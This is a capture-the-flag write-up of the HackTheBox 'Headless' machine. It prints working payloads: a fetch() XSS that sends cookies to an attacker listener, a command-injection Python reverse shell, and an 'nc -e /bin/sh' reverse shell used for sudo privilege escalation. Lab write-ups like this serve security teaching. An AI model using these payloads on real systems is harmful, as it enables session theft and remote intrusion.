---
title: "Headless Hackthebox"
date: 2024-07-05
draft: false
tags : ["write-up", "htb"]

---
## User flag
### Recon

Port scanning:
![alt text](/posts/headless-htb/image.png)

Directory scanning:

![alt text](/posts/headless-htb/image-1.png)

Server open a port (5000) for running a website. After scanning directories, I found 2 interesting directories :
* /support which we can access by `For questions` button. It has a form to submit a message. By checking its request, I find that it is using `POST` method to send data to the server. I try to send a message with a payload `<h1>alert(1)</h1>` and it responses a alert form which includes header of this request. Additionally, I decode `is_admin` cookie and get a string which have first part is `user` and second part is a unreadable string.

![alt text](/posts/headless-htb/image-2.png)

* /dashoard which is only for authenticated account. 

### Exploitation

Notice that the form print the header of request, so I try to change the header User-Agent to XSS payload and it works. 

After that, I set up a listener and send a payload to get the cookie. 
```javascript
<script>fetch("http://10.10.14.65:9030/?cookie="+document.cookie);</script>
```
I got the `is_admin` cookie.
![alt text](/posts/headless-htb/image-3.png)

Replace the cookie with the one I got, I can access the dashboard page.
![alt text](/posts/headless-htb/image-4.png)

Use `Generate report` button, the web will send a request with a parameter `data` equal the date we choose. I try to change it to a linux command and it works. Then, I use reverse shell payload to get shell.
```python
;export RHOST="10.10.14.65";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';
```

Get shell and user flag.
![alt text](/posts/headless-htb/image-5.png)


## Root flag
### Recon

Run `sudo -l` command, I see that I can run `sudo /usr/bin/syscheck` as root without password.
Command `syscheck` is looking for the `initdb.sh` program to execute. When `syscheck` is run as root, it will execute `initdb.sh` as root.

### Exploitation
Create a file `initdb.sh` with reverse shell payload and make it executable.
```bash
nc -e '/bin/sh' 10.10.14.65 7878
```

Run `syscheck` and get root shell.
![alt text](/posts/headless-htb/image-6.png)


